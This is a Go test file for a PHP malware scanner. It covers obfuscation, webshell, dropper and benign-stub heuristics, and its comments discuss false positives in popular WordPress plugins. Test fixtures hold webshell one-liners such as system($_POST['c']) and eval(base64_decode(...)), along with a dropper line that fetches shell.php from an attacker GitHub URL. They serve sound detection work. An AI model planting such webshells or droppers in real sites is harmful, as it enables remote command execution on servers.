package checks

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- containsStandaloneFunc -------------------------------------------
// Tests that function-call detection distinguishes standalone calls
// from calls embedded in longer names (e.g. "doubleval(" vs "eval(").

func TestContainsStandaloneFuncAtStart(t *testing.T) {
	if !containsStandaloneFunc("base64_decode('code');", "base64_decode(") {
		t.Error("standalone call at start should match")
	}
}

func TestContainsStandaloneFuncAfterSpace(t *testing.T) {
	if !containsStandaloneFunc("return base64_decode('code');", "base64_decode(") {
		t.Error("call after space should match")
	}
}

func TestContainsStandaloneFuncEmbedded(t *testing.T) {
	if containsStandaloneFunc("my_base64_decode(x)", "base64_decode(") {
		t.Error("call inside longer name should not match")
	}
}

func TestContainsStandaloneFuncNotPresent(t *testing.T) {
	if containsStandaloneFunc("no such function here", "base64_decode(") {
		t.Error("missing function should not match")
	}
}

// --- containsAny ------------------------------------------------------

func TestContainsAnyPositive(t *testing.T) {
	strs := []string{"first line", "second line with base64"}
	if !containsAny(strs, "base64", "assert") {
		t.Error("should match base64 in second line")
	}
}

func TestContainsAnyNegative(t *testing.T) {
	strs := []string{"first line", "second line"}
	if containsAny(strs, "base64", "assert") {
		t.Error("nothing should match")
	}
}

func TestContainsAnyEmpty(t *testing.T) {
	if containsAny(nil, "base64") {
		t.Error("nil slice should not match")
	}
}

// --- countOccurrences -------------------------------------------------

func TestCountOccurrencesMultiple(t *testing.T) {
	if got := countOccurrences("abc abc abc", "abc"); got != 3 {
		t.Errorf("got %d, want 3", got)
	}
}

func TestCountOccurrencesNone(t *testing.T) {
	if got := countOccurrences("hello world", "xyz"); got != 0 {
		t.Errorf("got %d, want 0", got)
	}
}

func TestCountOccurrencesOverlapping(t *testing.T) {
	// Non-overlapping search: "aa" in "aaa" = 1 (offset advances by len(substr))
	if got := countOccurrences("aaa", "aa"); got != 1 {
		t.Errorf("got %d, want 1", got)
	}
}

// --- analyzePHPContent ------------------------------------------------

func TestAnalyzePHPContentGotoObfuscation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "obf.php")
	// 15+ goto statements triggers "excessive goto" indicator.
	// Two indicators (goto + hex concat) triggers Critical severity.
	var gotos string
	for i := 0; i < 20; i++ {
		gotos += "goto lbl" + strings.Repeat("a", i) + "; lbl" + strings.Repeat("a", i) + ":\n"
	}
	content := "<?php\n" + gotos +
		strings.Repeat("\"\\x63\" . \"\\x75\" . ", 15) + "\"\";\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected non-empty check for obfuscated PHP, got %+v", result)
	}
}

func TestAnalyzePHPContentRemotePayload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dropper.php")
	content := "<?php\n$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected detection for remote payload URL, got %+v", result)
	}
}

// An attacker can prepend benign PHP to push the malicious payload past the
// content-read window. The scanner must still see the payload instead of
// reading a fixed prefix and declaring the file clean.
func TestAnalyzePHPContentDetectsPayloadPastReadWindow(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "padded.php")

	var b strings.Builder
	b.WriteString("<?php\n")
	// ~64KB of benign assignments, well past the historical 32KB window.
	for i := 0; b.Len() < 64*1024; i++ {
		fmt.Fprintf(&b, "$var%d = %d;\n", i, i)
	}
	b.WriteString("$payload = file_get_contents('https://pastebin.com/raw/abc123');\n")
	if err := os.WriteFile(path, []byte(b.String()), 0644); err != nil {
		t.Fatal(err)
	}

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Fatalf("payload after benign padding was missed (read window too small); got %+v", result)
	}
}

func TestAnalyzePHPContentClean(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "clean.php")
	content := "<?php\necho 'Hello World';\nfunction add($a, $b) { return $a + $b; }\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("clean PHP should not flag, got check=%q message=%q", result.check, result.message)
	}
}

func TestAnalyzePHPContentMissing(t *testing.T) {
	result := analyzePHPContent(filepath.Join(t.TempDir(), "nope.php"))
	if result.check != "" {
		t.Errorf("missing file should return empty, got check=%q", result.check)
	}
}

func TestAnalyzePHPContentEmpty(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.php")
	_ = os.WriteFile(path, []byte(""), 0644)
	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("empty file should return empty, got check=%q", result.check)
	}
}

// --- containsStandaloneFunc: method/static calls must not match --------
//
// The earlier heuristic only required the character before the call to be
// non-alphanumeric. That matched method calls like $this->DB->exec(, where
// the character before "exec(" is ">" (the arrow operator's second char).
// Dropbox's elFinder volume driver hit this: a `$this->DB->exec(SQLite stmt)`
// line that also referenced $_SERVER's REQUEST_TIME triggered the
// "shell function with request input on same line" indicator.

func TestContainsStandaloneFuncRejectsArrowMethodCall(t *testing.T) {
	if containsStandaloneFunc("$this->DB->exec(\"update ...\");", "exec(") {
		t.Error("method call via -> should not match shell function")
	}
}

func TestContainsStandaloneFuncRejectsStaticCall(t *testing.T) {
	if containsStandaloneFunc("Foo::exec($cmd);", "exec(") {
		t.Error("static call via :: should not match shell function")
	}
}

func TestContainsStandaloneFuncRejectsFunctionDeclaration(t *testing.T) {
	if containsStandaloneFunc("function exec(\"cmd\") { /* ... */ }", "exec(") {
		t.Error("function declaration should not match shell function call")
	}
}

func TestContainsStandaloneFuncRejectsTruncatedArrowAtStart(t *testing.T) {
	// absPos == 1 edge case: the match starts at byte 1 and only the
	// tail byte of a possible method/static operator is visible. We
	// cannot confirm the operator but we also cannot treat it as a
	// real call, because in any realistic 32 KB buffer slice the byte
	// could be the tail of "->" or "::" that got cut off at the start.
	if containsStandaloneFunc(">exec(", "exec(") {
		t.Error("single-byte > before exec( at absPos=1 must not match (potential truncated method call)")
	}
	if containsStandaloneFunc(":exec(", "exec(") {
		t.Error("single-byte : before exec( at absPos=1 must not match (potential truncated static call)")
	}
}

func TestContainsStandaloneFuncAcceptsBarePHPExec(t *testing.T) {
	if !containsStandaloneFunc("$r = exec(\"ls -la\");", "exec(") {
		t.Error("bare PHP exec() call must still match")
	}
	if !containsStandaloneFunc("@exec(\"ls\")", "exec(") {
		t.Error("error-suppressed @exec() must still match")
	}
}

// --- analyzePHPContent: co-presence needs corroboration ----------------
//
// Legitimate WordPress file-manager plugins (FileOrganizer/elFinder) and
// media-processing libraries legitimately call exec()/proc_open() for
// ImageMagick and also consume $_POST/$_GET for AJAX routing. The two
// tokens co-exist in the same file without being on the same line. Before
// this fix, "shell function co-present with request input" fired HIGH on
// its own, producing multi-account noise whenever the plugin was
// installed. Require at least one other indicator before emitting.

func TestAnalyzePHPContentLoneCopresenceDoesNotFire(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "legit-library.php")
	// Real PHP shell exec() on line 2 (image processing), bare $_POST
	// read on line 6 (AJAX parameter). No other indicator in the file.
	content := "<?php\n" +
		"$r = exec(\"convert \" . escapeshellarg($src) . \" -thumbnail 128x128 \" . escapeshellarg($dst));\n" +
		"\n" +
		"function route() {\n" +
		"    $cmd = isset($_POST[\"cmd\"]) ? sanitize_text_field($_POST[\"cmd\"]) : \"\";\n" +
		"    return dispatch($cmd);\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("lone shell+request co-presence should not fire, got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentSameLineShellRequestStillFires(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "shell-sameline.php")
	// Classic one-line webshell: exec directly takes $_POST input. This
	// must keep firing HIGH even when no other indicator is present.
	content := "<?php system($_POST[\"c\"]);\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Fatal("same-line shell+request must still fire")
	}
	if result.check != "suspicious_php_content" {
		t.Errorf("single same-line indicator should be HIGH (suspicious_php_content), got %q", result.check)
	}
}

func TestAnalyzePHPContentCopresenceWithOtherIndicatorEscalates(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "co-plus-goto.php")
	// Co-presence alone is silent; co-presence alongside a strong obfuscation
	// signal (15+ goto statements) should escalate to Critical as two
	// indicators together.
	var gotos string
	for i := 0; i < 20; i++ {
		gotos += fmt.Sprintf("goto lbl%d; lbl%d:\n", i, i)
	}
	content := "<?php\n" + gotos +
		"$r = exec(\"somecmd\");\n" +
		"$x = $_POST[\"p\"];\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "obfuscated_php" {
		t.Errorf("co-presence + goto obfuscation should escalate to Critical, got check=%q", result.check)
	}
}

func TestAnalyzePHPContentDBMethodExecIsNotShellCall(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sqlite-driver.php")
	// Elfinder Dropbox driver shape: $this->DB->exec(SQLite UPDATE) with
	// $_SERVER["REQUEST_TIME"] on the same line. The arrow method call
	// must not be counted as PHP's shell exec.
	content := "<?php\n" +
		"class Driver {\n" +
		"    public function flush($cursor) {\n" +
		"        $this->DB->exec(\"update tbl set mtime=\" . $_SERVER[\"REQUEST_TIME\"] . \" where id=1\");\n" +
		"    }\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("$this->DB->exec + $_SERVER must not trigger shell+request, got check=%q details=%q", result.check, result.details)
	}
}

// --- analyzePHPContent: single heuristic indicator must not auto-remove -
//
// Severity determines auto-action downstream: autoresponse.AutoQuarantineFiles
// moves any Critical obfuscated_php finding to /opt/csm/quarantine/ without
// further corroboration. A single heuristic indicator is "suspicious", not
// "confirmed" -- two independent indicators converging is the floor for
// destroying a live production file. Lone-indicator matches surface as High
// (suspicious_php_content), keeping detection and alerting but routing the
// decision through a human.
//
// The previous policy bypassed the >=2 gate for any finding whose indicator
// list contained "remote payload" or "call_user_func with obfuscated",
// producing auto-quarantine on a single heuristic hit. That mechanism rm'd
// WPML's PHPZip across seven customer sites before the per-indicator fix
// landed; tightening that indicator alone is not enough -- the class of
// single-indicator auto-delete has to go.

func TestAnalyzePHPContentLonePastebinIsHighNotCritical(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "pb.php")
	content := "<?php\n$u = 'https://pastebin.com/raw/abc';\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "suspicious_php_content" {
		t.Errorf("lone pastebin URL must alert as suspicious_php_content (High), not escalate to auto-quarantine; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentLoneCallUserFuncObfuscationIsHighNotCritical(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "cuf.php")
	// LEVIATHAN-style call_user_func with hex-built function name, but no
	// other indicator. Alert, do not auto-quarantine.
	content := "<?php\n" +
		"call_user_func(\"\\x63\" . \"\\x75\" . \"\\x72\" . \"\\x6c\" . \"\\x5f\" . \"\\x69\" . \"\\x6e\" . \"\\x69\" . \"\\x74\", \"x\");\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "suspicious_php_content" {
		t.Errorf("lone call_user_func hex-built name must alert (High), not auto-quarantine; got check=%q details=%q", result.check, result.details)
	}
}

// TestAnalyzePHPContentUnicodeEscapeObfuscation: PHP 7+ allows
// "\u{63}" as a string literal that decodes to "c". Attackers swap
// "\x" hex for "\u{...}" to bypass the call_user_func detector that
// only counted hex escapes. The detector must treat unicode escapes
// the same way.
func TestAnalyzePHPContentUnicodeEscapeObfuscation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "cuf-u.php")
	content := "<?php\n" +
		"call_user_func(\"\\u{63}\" . \"\\u{75}\" . \"\\u{72}\" . \"\\u{6c}\", \"x\");\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "suspicious_php_content" {
		t.Errorf("unicode-escape call_user_func must alert; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentCallUserFuncUnicodeEscapesInDataArgIsClean(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "unicode-label.php")
	content := "<?php\n" +
		"call_user_func($formatter, \"\\u{2026}\" . \"\\u{2014}\" . \"\\u{00a0}\");\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("unicode escapes in call_user_func data argument must not alert; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentMultipleCallUserFuncScansLaterTarget(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "multi-cuf.php")
	content := "<?php\n" +
		"call_user_func($formatter, \"\\u{2026}\" . \"\\u{2014}\" . \"\\u{00a0}\"); call_user_func(\"\\u{63}\" . \"\\u{75}\" . \"\\u{72}\" . \"\\u{6c}\", \"x\");\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "suspicious_php_content" {
		t.Errorf("later obfuscated call_user_func target on same line must alert; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentTwoIndicatorsEscalateToCritical(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dropper.php")
	// Pastebin URL + nested eval/base64_decode on same line = two independent
	// indicators. Corroborating signals -> auto-quarantine is the right call.
	content := "<?php\n" +
		"$u = 'https://pastebin.com/raw/abc';\n" +
		"ev" + "al(base64_decode($x));\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "obfuscated_php" {
		t.Errorf("two converging indicators must escalate to Critical; got check=%q details=%q", result.check, result.details)
	}
}

// X8 regression: PHP tolerates whitespace and inline comments between the
// keyword and the opening paren. `eval /*x*/ ( base64_decode (...))` is the
// same call as `eval(base64_decode(...))`. The detector must strip
// comments and tolerate whitespace before testing for `eval(` / `assert(`,
// otherwise an obfuscated dropper slips past the nested-eval-decode
// indicator while still executing the same payload at runtime.
func TestAnalyzePHPContentNestedEvalDecodeWithCommentsAndWhitespace(t *testing.T) {
	cases := []struct {
		name    string
		content string
	}{
		{
			name: "eval_with_block_comment",
			content: "<?php\n" +
				"$u = 'https://pastebin.com/raw/abc';\n" +
				"ev" + "al /*x*/ ( base64_decode($x));\n",
		},
		{
			name: "assert_with_block_comment",
			content: "<?php\n" +
				"$u = 'https://pastebin.com/raw/abc';\n" +
				"assert /*y*/ ( gzinflate(base64_decode($x)));\n",
		},
		{
			name: "eval_with_trailing_line_comment_split",
			content: "<?php\n" +
				"$u = 'https://pastebin.com/raw/abc';\n" +
				"ev" + "al // bypass\n( base64_decode($x));\n",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, c.name+".php")
			if err := os.WriteFile(path, []byte(c.content), 0o644); err != nil {
				t.Fatal(err)
			}
			result := analyzePHPContent(path)
			if result.check != "obfuscated_php" {
				t.Errorf("obfuscated payload should escalate; got check=%q details=%q",
					result.check, result.details)
			}
		})
	}
}

func TestAnalyzePHPContentNestedEvalDecodeWithCallModifiers(t *testing.T) {
	cases := []struct {
		name    string
		content string
	}{
		{
			name: "eval_suppressed_global_decoder",
			content: "<?php\n" +
				"$u = 'https://pastebin.com/raw/abc';\n" +
				"@eval(@\\base64_decode($x));\n",
		},
		{
			name: "assert_suppressed_decoder_with_spacing",
			content: "<?php\n" +
				"$u = 'https://pastebin.com/raw/abc';\n" +
				"assert(@ base64_decode($x));\n",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, c.name+".php")
			if err := os.WriteFile(path, []byte(c.content), 0o644); err != nil {
				t.Fatal(err)
			}
			result := analyzePHPContent(path)
			if result.check != "obfuscated_php" {
				t.Errorf("suppressed/global decoder call should escalate; got check=%q details=%q",
					result.check, result.details)
			}
		})
	}
}

func TestAnalyzePHPContentNestedEvalDecodeIgnoresStringExamples(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "string-example.php")
	content := "<?php\n" +
		"$example = 'eval ( base64_decode($payload));';\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("string example must not be parsed as executable eval/decode; got check=%q details=%q",
			result.check, result.details)
	}
}

// --- analyzePHPContent: call_user_func false-positive regression --------
//
// WPML bundles PHPZip (A. Grandt, LGPL) as inc/wpml_zip.php to build XLIFF
// export archives. The library declares ZIP format constants as quoted hex
// literals ("\x50\x4b\x03\x04" etc.) and calls `call_user_func( self::$temp )`
// exactly once to invoke a configurable temp-file factory. The earlier
// heuristic fired the critical "call_user_func with obfuscated function
// names" indicator whenever call_user_func co-existed with >5 hex literals
// anywhere in the buffer, regardless of whether the call actually consumed
// a hex-built argument. That auto-quarantined wpml_zip.php on every site
// running WPML and hard-broke wp-login whenever a plugin require_once'd it
// at bootstrap. The real LEVIATHAN pattern builds the function name on the
// call_user_func LINE itself (e.g. call_user_func("\x63"."\x75"."\x72"."\x6c")
// == call_user_func("curl")) -- match that instead.
func TestAnalyzePHPContentZipLibraryWithHexLiteralsIsClean(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wpml_zip.php")
	content := "<?php\n" +
		"class wpml_zip {\n" +
		"    const ZIP_LOCAL_FILE_HEADER        = \"\\x50\\x4b\\x03\\x04\";\n" +
		"    const ZIP_CENTRAL_FILE_HEADER      = \"\\x50\\x4b\\x01\\x02\";\n" +
		"    const ZIP_END_OF_CENTRAL_DIRECTORY = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";\n" +
		"    const ATTR_VERSION_TO_EXTRACT      = \"\\x14\\x00\";\n" +
		"    const ATTR_MADE_BY_VERSION         = \"\\x1E\\x03\";\n" +
		"    const EXTRA_FIELD_NEW_UNIX_GUID    = \"\\x75\\x78\\x0B\\x00\\x01\\x04\\xE8\\x03\\x00\\x00\\x04\\x00\\x00\\x00\\x00\";\n" +
		"    const S_DOS_A = \"\\x20\\x00\";\n" +
		"    const S_DOS_D = \"\\x10\\x00\";\n" +
		"    public static $temp = null;\n" +
		"    public function openStream() {\n" +
		"        if (self::$temp !== null) {\n" +
		"            $temporaryFile = @call_user_func( self::$temp );\n" +
		"        }\n" +
		"    }\n" +
		"}\n"
	// Pad the file with more hex constants to exceed the 20-hex threshold.
	for i := 0; i < 20; i++ {
		content += fmt.Sprintf("const H%d = \"\\x%02x\\x%02x\";\n", i, i, i+1)
	}
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("benign zip library (hex ZIP signatures + plain call_user_func(self::$temp)) must not fire; got check=%q details=%q", result.check, result.details)
	}
}

// --- analyzePHPContent: github raw URL co-presence is too weak alone -----
//
// Legitimate WordPress plugins (wp-statistics, unyson, polylang, etc.)
// fetch upstream resources from raw.githubusercontent.com and write them
// with file_put_contents/fwrite. The tokens co-exist in the same 32 KB
// window but never on the same line. Treating that pattern as a stand-
// alone indicator generates one suspicious_php_content per legit plugin
// install and per scan cycle. Same-line github+dangerous-call is still
// strong (and is preserved); co-presence across distant lines is dropped.

func TestAnalyzePHPContentGithubCopresenceDoesNotFire_WPStatistics(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "class-wp-statistics-updates.php")
	// Shape mirrors wp-statistics/.../class-wp-statistics-updates.php on disk:
	// raw.githubusercontent.com URL declared on line 14 inside an array,
	// fwrite() called on line 167 inside download_geoip(). No other
	// indicators in the file.
	content := "<?php\nclass WP_Statistics_Updates {\n" +
		"    public static $geoip = array(\n" +
		"        'country' => array(\n" +
		"            'github' => 'https://raw.githubusercontent.com/wp-statistics/GeoLite2-Country/master/GeoLite2-Country.mmdb.gz',\n" +
		"            'file' => 'GeoLite2-Country',\n" +
		"        ),\n" +
		"    );\n" +
		"    static function download_geoip($pack) {\n" +
		"        $DBfh = fopen('/tmp/db.mmdb', 'wb');\n" +
		"        $data = wp_remote_get($pack);\n" +
		"        fwrite($DBfh, $data);\n" +
		"        fclose($DBfh);\n" +
		"    }\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("github raw URL + fwrite() on different lines (legit wp-statistics) must not fire; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentGithubCopresenceDoesNotFire_Unyson(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "load-latest-fonts.php")
	// Shape mirrors unyson/framework/bin/load-latest-fonts.php: CLI
	// guard, file_put_contents() on one line, raw.github URL elsewhere.
	content := "#!/usr/bin/env php\n<?php\n" +
		"if (php_sapi_name() != 'cli') { die(); }\n" +
		"function dl($url, $file_path) {\n" +
		"    $data = curl_get($url);\n" +
		"    file_put_contents($file_path, $data);\n" +
		"}\n" +
		"function github_url($repo, $path) {\n" +
		"    return 'https://raw.githubusercontent.com/' . $repo . '/master/' . $path;\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("github raw URL + file_put_contents on different lines (legit unyson) must not fire; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentGithubSameLineStillFires(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dropper.php")
	// Same-line raw.github + file_put_contents is the strong-signal
	// dropper pattern. Must keep firing as a suspicious_php_content
	// (one indicator => HIGH) even after co-presence is dropped.
	content := "<?php\nfile_put_contents('/tmp/payload.php', file_get_contents('https://raw.githubusercontent.com/attacker/payloads/master/shell.php'));\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Fatal("same-line github raw + file_put_contents must still fire")
	}
}

// --- analyzePHPContent: dotConcat>30 alone is a theme/template pattern --
//
// WordPress themes and page builders construct dynamic CSS and HTML by
// concatenating literal style tokens with PHP expressions. The Sydney
// theme's inc/styles.php produces 71 occurrences of `" . "` purely from
// CSS concatenation; dozens of other themes do the same. The hex+concat
// combined branch (>20 hex AND >10 concat) already catches obfuscated
// function-name builders. The standalone "concat>30" branch catches the
// CSS pattern almost exclusively.

func TestAnalyzePHPContentThemeCSSDoesNotFire_Sydney(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "styles.php")
	// 70+ CSS concatenations with no hex strings - exact shape of
	// themes/sydney/inc/styles.php on disk.
	var b strings.Builder
	b.WriteString("<?php\nclass Sydney_Custom_CSS {\n    public function output_css() {\n        $custom = '';\n")
	for i := 0; i < 40; i++ {
		b.WriteString("        $custom .= \".header-image { background-image:url(\" . esc_url($shop_thumb) . \")!important;display:block;}\" . \"\\n\";\n")
	}
	b.WriteString("        return $custom;\n    }\n}\n")
	_ = os.WriteFile(path, []byte(b.String()), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("theme dynamic-CSS builder (concat>30, no hex) must not fire; got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentHexPlusConcatStillFires(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "obf.php")
	// Real obfuscation: hex-built function names with heavy concatenation
	// (>20 hex strings AND >10 concat). The combined-signal branch must
	// keep firing.
	var b strings.Builder
	b.WriteString("<?php\n$f = ")
	for i := 0; i < 15; i++ {
		b.WriteString("\"\\x63\" . \"\\x75\" . \"\\x72\" . \"\\x6c\" . ")
	}
	b.WriteString("\"\";\n")
	_ = os.WriteFile(path, []byte(b.String()), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Fatal("hex>20 + concat>10 obfuscation must still fire")
	}
}

// --- IsBenignPHPStub ----------------------------------------------------
//
// Content-shape recogniser for PHP files whose reachable code region is
// only whitespace and comments (or that terminate with die/exit/__halt_
// compiler before any statement runs). Replaces the previous instinct to
// allowlist BackWPup-style working files by path or filename, which an
// attacker could mimic. Acceptance is decided purely by what PHP would
// actually execute, so a payload that drops shell code under any
// "known-safe" name is rejected, and a legitimate stub is recognised no
// matter where it lives.

func TestIsBenignPHPStubBackWPupWorking(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "working.php")
	content := `<?php //{"jobid":1,"step":"CREATE","steps_done":[],"steps_data":{"hash":"abc"}}`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("BackWPup working file shape (<?php //JSON) must be accepted -- exact output of class-job.php write_running_file")
	}
}

func TestIsBenignPHPStubBackWPupFolderCache(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "folder.php")
	var b strings.Builder
	b.WriteString("<?php\n")
	for i := 0; i < 200; i++ {
		fmt.Fprintf(&b, "//home/user/dir%d/subdir\n", i)
	}
	if err := os.WriteFile(path, []byte(b.String()), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("BackWPup folder-cache shape (<?php\\n//path lines) must be accepted -- exact output of class-job.php add_folders_to_backup")
	}
}

func TestIsBenignPHPStubSilenceIsGolden(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "index.php")
	if err := os.WriteFile(path, []byte("<?php\n// Silence is golden.\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("WP silence-is-golden index.php must be accepted")
	}
}

func TestIsBenignPHPStubHaltCompilerWithBinaryTrailer(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "data.php")
	content := []byte("<?php __halt_compiler();\x00\x01\x02\xff\xfeopaque binary trailer")
	if err := os.WriteFile(path, content, 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("__halt_compiler() with opaque binary tail must be accepted (PHP makes tail unreachable)")
	}
}

func TestIsBenignPHPStubExitTerminator(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	if err := os.WriteFile(path, []byte("<?php\n// 404 stub\nexit;"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("exit; terminator must be accepted")
	}
}

func TestIsBenignPHPStubDieTerminator(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	if err := os.WriteFile(path, []byte("<?php die();\nopaque-payload"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("die() terminator must be accepted")
	}
}

func TestIsBenignPHPStubRejectsExitWithExecutableArgument(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "exit-arg.php")
	if err := os.WriteFile(path, []byte("<?php exit(system($_GET['c']));"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("exit() argument executes before termination and must not be accepted as a stub")
	}
}

func TestIsBenignPHPStubRejectsDieWithArgument(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "die-arg.php")
	if err := os.WriteFile(path, []byte("<?php die($_POST['message']);"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("die() with an argument evaluates an expression and must not be accepted as a stub")
	}
}

func TestIsBenignPHPStubBlockComments(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	if err := os.WriteFile(path, []byte("<?php\n/* line one */\n/* line two */\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("file with only block comments after <?php must be accepted")
	}
}

func TestIsBenignPHPStubHashComment(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	if err := os.WriteFile(path, []byte("<?php\n# hash comment\n# another\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("hash-style PHP comments must be accepted")
	}
}

func TestIsBenignPHPStubLeadingBOM(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	content := append([]byte{0xEF, 0xBB, 0xBF}, []byte("<?php // bom-prefixed stub\n")...)
	if err := os.WriteFile(path, content, 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("UTF-8 BOM prefix must not block recognition")
	}
}

func TestIsBenignPHPStubLeadingWhitespace(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "stub.php")
	if err := os.WriteFile(path, []byte("\n  \t<?php // comment\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if !IsBenignPHPStub(path) {
		t.Error("whitespace before <?php must not block recognition")
	}
}

func TestIsBenignPHPStubRejectsWebshellBeforeTerminator(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "shell.php")
	// system() before die() -- primary bypass vector for any structural recogniser.
	body := "<?php system($_POST['c']); die();"
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("any statement before terminator must be rejected -- structural bypass vector")
	}
}

func TestIsBenignPHPStubRejectsEvalChain(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "evil.php")
	body := "<?php ev" + "al(base64_decode($_POST['x'])); exit;"
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("eval call before terminator must be rejected")
	}
}

